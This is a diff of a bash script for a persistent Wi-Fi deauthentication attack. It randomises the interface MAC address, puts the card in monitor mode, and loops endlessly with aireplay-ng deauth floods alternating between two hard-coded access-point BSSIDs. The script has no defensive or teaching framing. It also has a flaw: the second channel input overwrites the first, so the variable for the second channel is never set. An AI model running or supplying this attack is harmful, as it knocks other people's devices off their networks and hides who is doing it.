@@ -1,38 +1,52 @@
 #!/bin/bash
+ip link set wlan0 down
+macchanger -r wlan0
+ip link set wlan0 up
+iw dev wlan0 set type monitor
+sleep 2
+echo "CH b0c0"
+read ch_b
+echo "CH 8000"
+read ch_b
 
-echo "CHANNEL"
-read ch
-echo "BSSID"
-read b
-echo "1:MDK4 2:AIREPLAY"
-read c
+b="80:03:84:a7:b0:c0"
 
+b1="80:03:84:a7:80:00"
 
-if [ "$b" = "1" ]; then
-	b="80:03:84:a7:b0:c0"
-elif [ "$b" = "2" ]; then
-	b="80:03:84:a7:80:00"
-elif [ "$b" = "sc" ]; then
-	b="80:03:84:a7:83:90"
-fi
+duration=200
 
+iface=wlan0
 
+while true; do
+	echo "[*] Switching"
+	iw dev wlan0 set channel "$ch_b"
+	sleep 1
+	timeout "$duration" bash -c '
+		while true; do
+			aireplay-ng --deauth 0 -a "'"$b"'" "'"$iface"'"
+			if [ $? -ne 0 ]; then
+				sleep 1
+			else
+				break
+			fi
+		done
+	'
 
+	sleep 2
 
-if [ "$c" = "1" ]; then
-	iw dev wlan0 set channel $ch
-	mdk4 wlan0 d -B "$b"
-elif [ "$c" = "2" ]; then
-	iw dev wlan0 set channel $ch
-	while true; do
-		aireplay-ng --deauth 0 -a "$b" wlan0
-		if [ $? -ne 0 ]; then
-			sleep 1
-		else
-			break
-		fi
-	done
-else
-	exit 1
-fi
-
+	echo "[*] Switching"
+	iw dev "$iface" set channel "$ch_b1"
+	sleep 1
+	timeout "$duration" bash -c '
+		while true; do
+			aireplay-ng --deauth 0 -a "'"$b1"'" "'"$iface"'"
+			if [ $? -ne 0 ]; then
+				echo "[!] Deauth failed for BSSID '"$b1"', retrying in 1s"
+				sleep 1
+			else
+				break
+			fi
+		done
+	'
+	sleep 2
+done
